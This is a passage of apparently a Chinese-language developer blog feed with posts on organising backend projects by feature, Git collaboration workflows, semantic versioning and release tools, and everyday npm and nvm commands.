title="後端專案依功能分類"></a>後端專案依功能分類</h3><p>依照資料功能去做區分，把同個資料表的 model、controller、route 集中存放，覺得較適合大型專案。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">├── src/</span><br><span class="line">│  ├── entities/                <span class="comment"># 按照資料表去區分</span></span><br><span class="line">│  │  └── user/                 <span class="comment"># 使用者表</span></span><br><span class="line">│  │     ├── model.js           <span class="comment"># Schema 定義</span></span><br><span class="line">│  │     ├── controller.js      <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">│  │     └── route.js           <span class="comment"># API 設定</span></span><br><span class="line">│  └── index.js                 <span class="comment"># 入口</span></span><br><span class="line">├── .eslintrc                   <span class="comment"># ESLint 設定檔</span></span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 軟體工程 </tag>
            
            <tag> 專案管理 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 時光機 X 專案協作與開發指南</title>
      <link href="/2022/09/29/relationships-between-frontend-and-backend/tool-git-with-project/"/>
      <url>/2022/09/29/relationships-between-frontend-and-backend/tool-git-with-project/</url>
      
        <content type="html"><![CDATA[<h2 id="Git-版本控制"><a href="#Git-版本控制" class="headerlink" title="Git 版本控制"></a>Git 版本控制</h2><p>Git 本身是一個分散式 (一個遠端和很多本地端) 的版本控制工具，會把每次提交的內容 (commit) 用快照透過校驗碼標示並儲存起來，校驗碼概念上可以當成車廂號碼，告訴可以查看車廂中的檔案及狀態。</p><p>實際比較像資料結構中的 Linked List 透過改變指標回到某個狀態也可以自由的切割和移動節點。</p><p><code>本日結果 -&gt; 昨日結果 -&gt; 前日結果</code></p><p>紀錄每個提交的項目主要會包含:</p><ul><li>Commit: 可以想成是指標</li><li>Parents: 會指向前一個 commit</li><li>Author: 用戶名稱</li><li>Date: 日期</li></ul><p>可以透過 <code>git log</code> 指令來查看過去紀錄:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Commit ea8ccbae1371612578d7f4711719f56c1e425ed9</span><br><span class="line">Parents 0e5acdc487a5974fad9563c1a301dc3bbf58ea2c</span><br><span class="line">Author: LinYenCheng &lt;linyencheng.tw@gmail.com&gt;</span><br><span class="line">Date:   Wed Sep 28 21:59:16 2022 +0800</span><br><span class="line"></span><br><span class="line">Commit  0e5acdc487a5974fad9563c1a301dc3bbf58ea2c</span><br><span class="line">Parents a1e45318a3eb15c18685ccdcb036bb42892e5627</span><br><span class="line">Author: LinYenCheng &lt;linyencheng.tw@gmail.com&gt;</span><br><span class="line">Date:   Wed Sep 28 21:07:40 2022 +0800</span><br></pre></td></tr></table></figure><h2 id="為什麼要使用-Git-版本控制"><a href="#為什麼要使用-Git-版本控制" class="headerlink" title="為什麼要使用 Git 版本控制"></a>為什麼要使用 Git 版本控制</h2><blockquote><p>人生就是不斷在後悔中持續成長</p></blockquote><p>生命中的每個不同階段總有不少事情，會讓我們後悔當時怎麼沒有去做，回過頭反省那些決定，也都會產生不一樣的看法。</p><p>比如你各位!!!當年學生時期喜歡上的那個男孩或女孩，為什麼當時就不懂得好好珍惜和努力?!說個我喜歡你很困難嗎?!</p><p>時光飛逝幾年過去，也許喜歡的那個誰已經有了小孩，而你，卻還在魯，這樣魯下去可以嗎?是不是很想回到過去?</p><p>雖然人生沒有辦法版本控制也沒辦法回到從前，但寫程式可以，到了專案不同的階段，也許也會想要再次回頭嘗試看看過去的解決方案。</p><ul><li>使用前: 用資料夾版本控制</li><li>使用後: 除了版本訊息外更提供了切割和移動等進階功能</li></ul><p>在個人開發上我們可以用來取代之前開資料夾的方式，還原也更為方便。</p><p>常見且小編使用過的版控服務有</p><ul><li>bitbucket: <a href="https://bitbucket.org/">https://bitbucket.org/</a></li><li>github: <a href="https://github.com/">https://github.com/</a></li><li>gitlab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></li><li>Azure DevOps: <a href="https://azure.microsoft.com/en-us/products/devops/">https://azure.microsoft.com/en-us/products/devops/</a></li></ul><h3 id="Git-初始化專案"><a href="#Git-初始化專案" class="headerlink" title="Git 初始化專案"></a>Git 初始化專案</h3><p>首先要先安裝 <a href="https://git-scm.com/">Git</a>，專案目錄輸入 <code>git init</code> 初始化版本控制，接著 <code>git add . </code> 加入所有目錄中相關檔案並執行 <code>git commit</code> 進行提交即可。</p><h2 id="用-Git-協助專案開發"><a href="#用-Git-協助專案開發" class="headerlink" title="用 Git 協助專案開發"></a>用 Git 協助專案開發</h2><p>個人開發上開分支的情境可能比較少，個人過去經驗是:</p><ul><li>新功能短暫交給其他人開發</li><li>升級函式庫的重構</li></ul><p>分支其實就是在快照上面新增一個指標，叫做分支的名稱，名稱就會指向那個校驗碼，方便切換過去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本日結果1 - 昨日結果 - 前日結果</span><br><span class="line">              |         |</span><br><span class="line">本日結果2 -----      　  |</span><br><span class="line">                        |</span><br><span class="line">本日結果3  --------------</span><br></pre></td></tr></table></figure><p>開源專案或是跟團體共同協作程式時，為了減少衝突的發生也希望大家都盡可能不受影響的開發，我們會希望大家都遵守一些流程和原則:</p><ul><li>原子化提交 (Atomic Commit): 減少每個 commit 耦合，未來在還原或拆掉時也不需要確認太多事情</li><li>約定式提交 (Conventional Commits): 方便之後 release 的統整</li><li>合併請求 (Pull Request): 團隊成員的 commit 都會以 PR 當單位進入長期分支中</li><li>Git&#x2F;GitHub Flow: 按照團隊的規則讓 commit 們去到該去的地方</li></ul><h3 id="原子化提交-Atomic-Commit"><a href="#原子化提交-Atomic-Commit" class="headerlink" title="原子化提交 (Atomic Commit)"></a>原子化提交 (Atomic Commit)</h3><p>原子化的概念其實在很多地方都很適用，尤其是在前端網頁設計 (Atomic Design) 上，就像我們先完成元件 (Atomic component)，才把元件組成一個功能，再將功能組成一個頁面。</p><p>一個好的 commit 紀錄就是將這些東西按照步驟實作的過程，在前端專案，通常會是 component-based 的元件，所以元件或頁面的 commit 就會包含組成的過程。</p><ul><li>Layout</li><li>theme or style</li><li>render 邏輯</li><li>資料串接</li></ul><p>以上面的例子來說，如果未來我們需要抽換主視覺，我們是不是就可以找到 theme style 的 commit 來進行複習修改即可?</p><h3 id="約定式提交-Conventional-Commits"><a href="#約定式提交-Conventional-Commits" class="headerlink" title="約定式提交 (Conventional Commits)"></a>約定式提交 (Conventional Commits)</h3><p>約定提交規範是在程式碼提交的時按照一組簡單的規則來建立明確的提交歷史。</p><p>當然如果只有自己開發也沒有想要理解自己過去的歷史，那當然訊息可以隨便<del>打個字元</del>就好了。</p><p>當規範出現後，相關支援 SemVer 的自動化工具就能協助進行整理成<a href="https://linyencheng.github.io/2022/09/28/relationships-between-frontend-and-backend/tool-semantic-version-and-release/">語意化的版號</a>，並且透過版號能夠看出背後的意涵。</p><p>訊息格式會像這樣 <code>類型(範圍): 敘述</code>，範圍通常用檔名，所以一個 commit 訊息可能會是:</p><p><code>BREAKING CHANGE(README.md): 影響功能</code></p><p>常用類型:</p><ul><li>fix(pencil): 什麼竟然有 typo</li><li>feat(pencil): 加入橡皮擦變成擦擦筆</li><li>perf(pencil): 2B 寬度變兩倍</li></ul><p>其他可能有機會用到的:</p><ul><li>docs: 文件</li><li>refactor: 重構</li><li>revert: 復原</li><li>style: 長相風格相關，不影響功能</li><li>test: 測試功能</li><li>chore: 打雜類的工作</li></ul><h4 id="語意化版本"><a href="#語意化版本" class="headerlink" title="語意化版本"></a>語意化版本</h4><p><a href="https://linyencheng.github.io/2022/09/28/relationships-between-frontend-and-backend/tool-semantic-version-and-release/">語意化的版本號碼</a>通常會有三個數字，舉例來說 <code>v1.2.3</code> 就代表 <code>vMajor.Minor.Patch</code></p><ul><li>Major: 寫法或 API 可能不相容前一個版本</li><li>Minor: 加了新的 feature 通常不影響前一個版本</li><li>Patch: 修 bug 不影響前一個版本</li></ul><p>回想我們升級相關套件的時候，是不是都會去看別人的 release note 或是 change log，當我們的 commit 都有規則，我們可以<a href="https://github.com/semantic-release/semantic-release">使用工具</a>幫我們輕鬆做好這件事。</p><h3 id="合併請求-Pull-Request"><a href="#合併請求-Pull-Request" class="headerlink" title="合併請求 (Pull Request)"></a>合併請求 (Pull Request)</h3><p>當完成這次需要實作的功能時，就會用現在的 branch (比起遠端多了新開發的 commit) 對遠端的分支發一個合併請求 (PR)，並透過 PR 的說明告訴大家這次的更動內容。</p><p>當我們撰寫 PR 時，Review 程式碼的人可能是新人也可能很久沒看這部分，所以 PR 中盡可能去提供:</p><ul><li>預備知識</li><li>需要特別注意的地方</li><li>有沒有未來可改善的 <code>// TODO:</code></li><li>測試步驟</li></ul><p>有時候團隊成員其實不知道你怎麼會選擇這個解決方案，所以時間又更允許的話，可以盡可能提供當下的想法和見解給大家知道。</p><p>畢竟有的時候我們只有當下的最佳解，有的時候時間只夠我們 make it work，這時候就很適合留個 <code>// TODO:</code>，等到未來有空的時候大家知道可以 Make it right 甚至 Make it fast。</p><blockquote><p>前同事 J: 當考慮解決方案的時候，想想每個解法的利弊，可以從更多面向看到不同的優缺點</p></blockquote><p>狀態好的時候可以學著追求完美，至於狀態不好的時候，完整就謝天了，一個好的 PR</p><ul><li>理論上只能有相關的 commit</li><li>每個 commit 最好不要更動太多檔案，會難以閱讀</li></ul><blockquote><p>前同事 W: 專案合作上，盡量保持多想想怎麼讓團隊每個人都舒服</p></blockquote><p>當我們操作失當的時候，可能會發現 PR 中出現了很多不必要的 commit，其中一個原因可能是因為太久沒有跟遠端分支同步的關係，這時候:</p><blockquote><p>同事可能 OS: 乾，你那什麼 PR，裡面一堆東西，我已經很忙了，這他媽一堆 commit 是要看三小??!</p></blockquote><p>好同事可能就會提醒你說，沒關係不要緊張，因為好的 commit 紀錄是可以做出來的。</p><p>Commit 只需要東拼西湊整理好即可，當我們發現現在版本跟測試機或是正式機 (master) 差異過大時，有兩種方式</p><ol><li>重新從 master 開新分支，一個個把需要的 commit 抓進來 (cherry-pick)</li><li>以 master 當 base 重新往下長我們的 commit，這就是 rebase 的用法</li></ol><p>過程中也可以透過 rebase 互動模式拔掉 (drop) 或合併一些 (squash) 不想要的 commit，把現在的分支經過整理之後，重新發一個或是回去看看我們的 PR 這時候肯定就會發現真的整齊了不少，底下推薦三個常用指令</p><ol><li>拆掉已經加上去的 Commit: <code>git reset --soft HEAD~1</code>，數字表示移動到 HEAD 後面第幾個</li><li>把其他的 Commit 抓過來: <code>git cherry-pick ea8ccba</code></li><li>整理 Commit: <code>git rebase -i ea8ccba</code></li></ol><h4 id="PR-合併策略"><a href="#PR-合併策略" class="headerlink" title="PR 合併策略"></a>PR 合併策略</h4><ol><li>Merge: 忠實紀錄完整呈現，但有時候線圖會穿插較不整齊且不易閱讀</li><li>Squash: 有一派的說法是當功能完成後，過去的 commit 都不重要，合併進去時就是一個 commit 紀錄我們完成了什麼功能即可</li><li>Rebase: 將起點移到最新，才進行合併，線圖會較整齊</li></ol><h3 id="Git-GitHub-Flow"><a href="#Git-GitHub-Flow" class="headerlink" title="Git&#x2F;GitHub Flow"></a>Git&#x2F;GitHub Flow</h3><p>將程式碼加入版本控制系統後，當下的程式會被放在主要的分支 master 或 main。</p><p>原則上主要分支是不會也不可以被協作者直接操作的，Git Flow 還建議專案 可以有其他分支如下:</p><ul><li>master: 長期存在的主要分支，可以看成是正式網站</li><li>develop: 長期存在的開發分支，可以看成是測試站台</li><li>hotfix: 短期分支，解完 bug 合併後可以看情況移除</li><li>release: 短期分支，需要一點時間合併幾個 feature 才要一起 release</li><li>feature: 短期分支，短期開發的小功能</li></ul><p>當團隊開發時，情境如果是如果是新的 feature，然後大概一周內會合併進去 develop 我們就會:</p><ol><li>先評估我們的東西屬於哪個類別 (feature)，之後要進到哪個分支 (develop)</li><li>從 develop 開一個影分身的短期分支叫做 feature</li><li>團隊就會以 feature 為準，並在個人本機端上的開分支進行開發</li><li>個人分配的 feature 開發結束後，每個 Pull Request 都會對 feature 送</li><li>當經過團隊 review 之後就可以被 merge 進去 feature</li><li>所有的 feature 完成並測試後，再以 feature 分支對 develop 發 release 到測試站的 PR</li><li>測試無誤後就正式 release 到正式站</li></ol><p>其實也有一說是當 CI&#x2F;CD 及測試穩定時，如果產品版本不分散的話，團隊只需要一個 Master，任何改動及修改都對 Master 即可。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 軟體工程 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>語意化版本透露什麼訊息</title>
      <link href="/2022/09/28/relationships-between-frontend-and-backend/tool-semantic-version-and-release/"/>
      <url>/2022/09/28/relationships-between-frontend-and-backend/tool-semantic-version-and-release/</url>
      
        <content type="html"><![CDATA[<p>當我們使用 JavaScript 開發時，常常會需要使用 npm 進行 node_modules 的安裝，相關的使用說明可以參考前一篇寫的 <a href="https://linyencheng.github.io/2022/09/27/relationships-between-frontend-and-backend/tool-npm/?utm_source=link&utm_medium=article&utm_campaign=internal_link">NPM 常用指令教學</a>。</p><p>在時間管理大師的世界裡，記住曾經和每個對象的回憶跟說過的話是很重要的，隨著對象越多就越有可能在某天踢到鐵板?!</p><p>如果對象與對象之間的相似性和重疊性越高，就可能面臨不敢改變的風險，譬如工作譬如興趣譬如作息譬如說過的情話，隨著時光飛逝，該怎麼好好記錄和應對?!</p><p>在專案中，使用的套件與套件之間也可能產生相依性，那當版本需要升級時該怎麼評估和測試可能的影響?</p><p>在使用套件的過程中，版本號<a href="https://docs.npmjs.com/about-semantic-versioning">代表的意涵</a>就相對重要，這篇文章中將提到:</p><ul><li>語意化版本</li><li>約定式提交</li><li>自動產生版號、版本資訊<ul><li>semantic-release</li><li>standard-version</li></ul></li></ul><h2 id="語意化版本-Semantic-Versioning"><a href="#語意化版本-Semantic-Versioning" class="headerlink" title="語意化版本 (Semantic Versioning)"></a>語意化版本 (Semantic Versioning)</h2><p>Semantic 是語意化的意思，目標是讓用戶可以透過版本號看出相關資訊，所以語意化的版本控制會有三個要素</p><ol><li>版號必須有三位數字 <code>1.2.3</code> 對應到 <code>主版號.次版號.修訂號</code>，三位數字為非負整數，且會遞增</li><li>依照以 <a href="https://semver.org/">semver 的原則</a></li></ol><ul><li>修訂號，在做了向下相容的修正後遞增</li><li>次版號，有向下相容的新功能出現時遞增</li><li>主板號，有任何不向下相容的修改時遞增</li></ul><ol start="3"><li>開發階段的主版號會是 0，正式環境後會是大於 1 的數字</li></ol><p>版號資訊會在 <code>package.json</code> 中 version 這個值，另外版本資訊都跟 git tag 有關，通常會寫在:</p><ul><li>版本控制系統的介面中的: <code>Releases</code> (<a href="https://github.com/facebook/react/releases">點我看範例</a>)</li><li><code>CHANGELOG.md</code> 檔 (<a href="https://github.com/LinYenCheng/virus-and-where-to-find-them/blob/master/CHANGELOG.md">點我看範例</a>)</li></ul><p>所以當我們每次進行發佈前:</p><ol><li>修改版號</li><li>加上 git tag</li><li>撰寫 <code>CHANGELOG.md</code></li><li>更新到版本控制系統中撰寫 Release Note</li><li>發佈</li></ol><h2 id="約定式提交-Conventional-Commits"><a href="#約定式提交-Conventional-Commits" class="headerlink" title="約定式提交 (Conventional Commits)"></a>約定式提交 (Conventional Commits)</h2><p>約定提交規範是在程式碼提交的時按照一組簡單的規則來建立明確的提交歷史。</p><p>當規範出現後，相關支援 SemVer 的自動化工具就能協助進行整理。</p><p>訊息格式會像這樣 <code>類型(範圍): 敘述</code>，範圍通常用檔名，所以一個 commit 訊息可能會是:</p><p><code>BREAKING CHANGE(README.md): 第一版說明文件</code></p><p>常用類型:</p><ul><li>BREAKING CHANGE: 影響功能</li><li>feat: 新增功能</li><li>perf: 效能改善</li><li>fix: 修正 bug</li></ul><p>舉例來說 Commit 就會長成</p><ul><li>fix(pencil): 什麼竟然有 typo</li><li>feat(pencil): 加入橡皮擦變成擦擦筆</li><li>perf(pencil): 2B 寬度變兩倍</li></ul><p>其他不會被統整，但可能有機會用到的:</p><ul><li>docs: 文件</li><li>refactor: 重構</li><li>revert: 復原</li><li>style: 長相風格相關，不影響功能</li><li>test: 測試功能</li><li>chore: 打雜類的工作</li></ul><p>約定式提交有另外一個好處，那就是在 Code Review 的時候，可以很快的知道什麼該看什麼不該看，以小編的習慣來說只會認真看 feat 以及 fix 的部分。</p><p>Angular Commit Message Conventions:</p><p><a href="https://github.com/angular/angular/blob/master/CONTRIBUTING.md#-commit-message-format">https://github.com/angular/angular/blob/master/CONTRIBUTING.md#-commit-message-format</a></p><h2 id="自動化版號與版本資訊產生工具"><a href="#自動化版號與版本資訊產生工具" class="headerlink" title="自動化版號與版本資訊產生工具"></a>自動化版號與版本資訊產生工具</h2><p>只要 commit 訊息有遵守約定式提交相關原則，<a href="https://github.com/conventional-changelog/commitlint">commit-lint</a> 或是 <a href="https://github.com/commitizen/cz-cli">commitizen</a> 等工具就有辦法做到強制產生提交資訊。</p><p>那按照適用的環境主要有以下兩個工具:</p><table><thead><tr><th><a href="https://github.com/semantic-release/semantic-release">semantic-release</a></th><th><a href="https://github.com/conventional-changelog/standard-version">standard-version</a></th></tr></thead><tbody><tr><td>有 CI&#x2F;CD</td><td>無 CI&#x2F;CD</td></tr><tr><td>git tag 及 releases</td><td>git tag 及 <code>CHANGELOG.md</code></td></tr></tbody></table><h3 id="semantic-release"><a href="#semantic-release" class="headerlink" title="semantic-release"></a>semantic-release</h3><p><a href="https://github.com/semantic-release/semantic-release">semantic-release</a> 自動化了套件的發布流程:</p><ol><li>確定下一個版本號</li><li>產生成發佈說明</li><li>發布套件</li></ol><p>在自動化過程中，不再需要靠感覺撰寫版號，嚴格遵循語義版本控制規範，並且透過版號表示更改的影響範圍，語義發布會在發布分支上每次成功建置後在 CI 環境中執行，不會有任何人介入發布的過程可以減少人為的失誤。</p><ol><li>在程式碼進行 PR 產生 Merge 時觸發</li><li>透過 CI 工具中執行相關指令進行發佈</li><li>自動統整 commit 訊息成 Release Note</li><li>自動修改版號並加上 Git Tag</li><li>發佈</li></ol><h3 id="standard-version"><a href="#standard-version" class="headerlink" title="standard-version"></a>standard-version</h3><p>基於 Conventional Commits 並使用 semver 生成 CHANGELOG 的版本控制工具，standard-version 只會在本機端處理版本控制、更改日誌生成和 Git Tag。</p><p>運行後 standard-version，您可以查看發布狀態、修正正錯誤並依照公司規範進行發佈。</p><p>跟 semantic-release 一樣都都是很棒的工具，允許自動化的情況下是建議盡量使用 semantic-release 而不是 standard-version。</p><ol><li>本機端執行指令</li><li>自動統整 Conventional Commits 並更新 <code>CHANGELOG.md</code></li><li>更新版號並加上 git tag</li><li>執行 Push 相關指令更新至版控系統</li><li>發佈</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 軟體工程 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm 入門到進階X常用指令與版本規則教學</title>
      <link href="/2022/09/27/relationships-between-frontend-and-backend/tool-npm/"/>
      <url>/2022/09/27/relationships-between-frontend-and-backend/tool-npm/</url>
      
        <content type="html"><![CDATA[<h2 id="npm-介紹"><a href="#npm-介紹" class="headerlink" title="npm 介紹"></a>npm 介紹</h2><p>什麼是 npm? npm 是 Node Package Manager 的縮寫，是 <a href="https://nodejs.org/zh-tw/">Node.js</a> 預設的 node 套件管理平台，npm 本機端的相關工具在<a href="https://nodejs.org/zh-tw/">安裝 node.js</a> 時也會一起安裝，另一套 Package Manager 本機端工具則是 <a href="https://yarnpkg.com/">Facebook 推出的 Yarn</a>。</p><p>套件做到的事就是別人已經研究過的東西我們可以不需要再研究一次，就像增加魅力的日常穿搭或是實用小物來說，我們其實就可以透過閱讀一些日雜來學習和應用。</p><p>小編甚至發現一些日雜還會附贈一些 C&#x2F;P 值高也實用好看的小物，透過別人整理好的套件，雖然沒辦法個人和客製化，但也能夠在各方面快速達到一個水平，這就是套件的好處。</p><p>套件管理工具就像是那些雜誌或是懶人包的型錄，能快速幫我們在方方面面進入狀況，要把到妹跟專案能不能上線似乎有點類似，最重要的就是快速在各方面都能達到某些限制條件的水平。</p><p>當撰寫網頁應用程式時，會使用到其他撰寫好的套件或模組，在未使用任何 build tool 時，通常</p><ol><li>透過 CDN 將樣式或是腳本放在 HTML 中</li><li>寫在 JavaScript 中動態加入 <code>&lt;script src=&quot;&quot;&gt;</code> 的 tag</li></ol><p>當套件或模組越來越多時，版本或相容管理複雜度就會增加，此時透過 Package Manager 指令能更方便進行套件的管理動作 (安裝、升級或刪除)，接下來這篇文章將提到:</p><ul><li>Package json 是什麼</li><li>npm 安裝 node_module 的語法</li><li>node_module 版本號碼</li><li>npm 維護 node_module 的語法</li><li>用 nvm 管理 node.js 版本</li></ul><h3 id="Package-json"><a href="#Package-json" class="headerlink" title="Package.json"></a>Package.json</h3><p>NPM 是一個 package manager，當專案什麼都沒有的時候，在<a href="https://nodejs.org/zh-tw/">安裝 Node.js</a> 後會需要在專案根目錄輸入 <code>npm init</code> 來把專案初始化。</p><p>填入相關資訊後，未來所有關於套件的相關配置檔都會存在 <code>package.json</code> 中，安裝第一個套件後同時也會多出一個 package-lock.json 檔來保存安裝的紀錄。</p><ul><li>dependencies: 執行環境會需要</li><li>devDependencies: 開發或測試環境需要</li><li>optionalDependencies: 不一定在每個環境都能夠裝起來</li></ul><h3 id="package-lock-json"><a href="#package-lock-json" class="headerlink" title="package-lock.json"></a>package-lock.json</h3><p>會在更動 node_modules 或 package.json 的時候自動產生相關紀錄，package-lock.json 會非常詳細記錄相關套件的版本號。</p><p>目前總共有 v1 v2 v3 三個版本，v3 版後 lockfile 會藏在 <code>node_modules/.package-lock.json</code></p><p>v1: 相容 npm v5 v6<br>v2: 相容 npm v7+ 且會向下相容 v1.<br>v3: 相容 npm v7+ 無法向下相容，因為會藏起來在 <code>node_modules/.package-lock.json</code></p><h3 id="npm-install-安裝-node-module-的語法"><a href="#npm-install-安裝-node-module-的語法" class="headerlink" title="npm install 安裝 node_module 的語法"></a>npm install 安裝 node_module 的語法</h3><p>用最常用的 lodash 舉例，列出幾種指令與結果說明</p><table><thead><tr><th>指令</th><th>node_modules</th><th><code>package.json</code> 說明</th></tr></thead><tbody><tr><td><code>npm install lodash;</code></td><td>專案環境</td><td>僅安裝最新版本</td></tr><tr><td><code>npm install lodash -g;</code></td><td><strong>全域環境</strong></td><td>僅安裝最新版本</td></tr><tr><td><code>npm install lodash@4.17.4</code></td><td>專案環境</td><td>僅安裝<strong>指定版本</strong></td></tr><tr><td><code>npm install lodash --save;</code></td><td>專案環境</td><td>安裝並加入 <strong>dependencies</strong></td></tr><tr><td><code>npm install lodash --save-dev;</code></td><td>專案環境</td><td>安裝並加入 <strong>devDependencies</strong></td></tr><tr><td><code>npm install lodash -O;</code></td><td>專案環境</td><td>安裝並加入 <strong>optionalDependencies</strong></td></tr></tbody></table><p>透過以下指令可以針對 <code>package.json</code> 做安裝 ，熟悉這些指令在未來我們需要控制 Docker Image 的大小、縮短 CI&#x2F;CD 的時間上會有很大的幫助。</p><table><thead><tr><th>指令</th><th>說明</th></tr></thead><tbody><tr><td><code>npm install</code></td><td>安裝 <code>package.json</code> 中的套件列表</td></tr><tr><td><code>npm install --no-optional;</code></td><td>不安裝 optionalDependencies</td></tr><tr><td><code>npm install --production</code></td><td>執行環境，不安裝 devDependencies</td></tr></tbody></table><h4 id="npm-install-失敗"><a href="#npm-install-失敗" class="headerlink" title="npm install 失敗"></a>npm install 失敗</h4><ul><li>更新 lockfile <code>npm i --package-lock-only</code></li><li>npm install -g <a href="mailto:&#x6e;&#x70;&#x6d;&#x40;&#88;&#46;&#88;&#46;&#x58;">&#x6e;&#x70;&#x6d;&#x40;&#88;&#46;&#88;&#46;&#x58;</a> 退版到適合版本</li><li>當 Nodejs 從 v14 升級到 v16 以上 lock 檔版本衝突，可選擇 npm 降版或 <code>npm i --force</code></li><li>相依性出現問題，可使用 <code>npm install --legacy-peer-deps</code></li></ul><h4 id="npm-套件版本衝突"><a href="#npm-套件版本衝突" class="headerlink" title="npm 套件版本衝突"></a>npm 套件版本衝突</h4><p>可以執行 <code>npm ls</code> + 套件名稱，舉例來說最常遇到的會是 eslint 的問題，就可以輸入 <code>npm ls eslint</code>，來看是在什麼地方出現衝突。</p><h3 id="npm-ci"><a href="#npm-ci" class="headerlink" title="npm ci"></a>npm ci</h3><p><code>npm ci</code> 的 ci 是 Clean install 的意思，因為 <code>npm install</code> 有時候會因為套件的升級等等導致安裝失敗，<code>npm ci</code> 會針對 <code>package-lock.json</code> 來還原套件，較適合是用在 CI 環境。</p><h3 id="node-module-版本號碼"><a href="#node-module-版本號碼" class="headerlink" title="node_module 版本號碼"></a>node_module 版本號碼</h3><p>node_module 版號通常會有三位數字 <code>1.2.3</code> 對應到 <code>主版號.次版號.修訂號</code>，<a href="https://semver.org/lang/zh-TW/">版號遞增規則如下</a>：</p><ul><li>主版號：當你做了不相容的 API 修改</li><li>次版號：當你做了向下相容的功能性新增</li><li>修訂號：當你做了向下相容的問題修正</li><li>先行版號及版本編譯資訊: 加到「主版號.次版號.修訂號」的後面，作為延伸</li></ul><p>安裝特定版號的方法，可以去 <a href="https://semver.npmjs.com/">npm 官方提供的計算機</a>試用看看</p><ul><li>主版號: * or x</li><li>次版號: 1 or 1.x or ^1.0.4</li><li>修訂號: 1.0 or 1.0.x or ~1.0.4</li><li>先行版號: 1.0.0-beta7</li></ul><h3 id="npm-維護-node-module-的語法"><a href="#npm-維護-node-module-的語法" class="headerlink" title="npm 維護 node_module 的語法"></a>npm 維護 node_module 的語法</h3><table><thead><tr><th>指令</th><th>說明</th></tr></thead><tbody><tr><td><code>npm audit</code></td><td>查看是否 node_modules 有相關資安漏洞</td></tr><tr><td><code>npm audit fix</code></td><td>自動修正相關漏洞</td></tr><tr><td><code>npm update</code></td><td>更新可更新的 node_modules</td></tr><tr><td><code>npm prune</code></td><td>清理 node_modules 中不需要的檔案</td></tr></tbody></table><h2 id="用-nvm-管理-node-js-版本"><a href="#用-nvm-管理-node-js-版本" class="headerlink" title="用 nvm 管理 node.js 版本"></a>用 nvm 管理 node.js 版本</h2><p>nvm 是一套管理 node.js 版本的工具，尤其在同時須開發不同版本 node.js 專案時很好用，<a href="https://github.com/coreybutler/nvm-windows">windows 也有提供開源的版本</a>可以使用。</p><p>舉例來說用了這套工具升級就只要兩步驟很簡單</p><ol><li><code>nvm install --lts</code></li><li><code>nvm use --lts</code>。</li></ol><p>注意事項:</p><ul><li>nvm-windows<ul><li>解除安裝已安裝的 node</li><li>清空相關資料夾 <code>C:\Program Files\nodejs</code></li><li>解除安裝已安裝的 npm</li><li>清空相關資料夾 <code>C:\Users\&lt;user&gt;\AppData\Roaming\npm</code></li></ul></li><li>mac<ul><li>不要用 brew 安裝</li></ul></li></ul><table><thead><tr><th>指令</th><th>說明</th></tr></thead><tbody><tr><td><code>nvm install 8.17.0</code></td><td>安裝特定版本</td></tr><tr><td><code>nvm use 8.17.0</code></td><td>使用特定版本</td></tr></tbody></table><h3 id="nvmrc"><a href="#nvmrc" class="headerlink" title=".nvmrc"></a>.nvmrc</h3><p>如果專案大多使用不同 Node 版本，也可以在專案中加入 <code>.nvmrc</code> 方便使用。</p><p>在專案中新增一個 <code>.nvmrc</code> 然後填入版本即可執行 <code>nvm use</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12.16.1</span><br></pre></td></tr></table></figure><h2 id="node-version"><a href="#node-version" class="headerlink" title=".node-version"></a>.node-version</h2><p><code>.node-version</code> 是一個能被多種工具讀取的配置檔，開發者也透過其他跨平台管理工具來管理 Node 的版本。</p><ul><li>fnm: <a href="https://github.com/Schniz/fnm">https://github.com/Schniz/fnm</a></li><li>nvs: <a href="https://github.com/jasongin/nvs">https://github.com/jasongin/nvs</a></li><li>nodenv: <a href="https://github.com/nodenv/nodenv">https://github.com/nodenv/nodenv</a></li></ul><p>線上發佈服務</p><ul><li>Cloudflare Pages: <a href="https://developers.cloudflare.com/pages/platform/build-configuration#language-support-and-tools">https://developers.cloudflare.com/pages/platform/build-configuration#language-support-and-tools</a></li><li>netlify: <a href="https://docs.netlify.com/configure-builds/manage-dependencies/#node-js-and-javascript">https://docs.netlify.com/configure-builds/manage-dependencies/#node-js-and-javascript</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
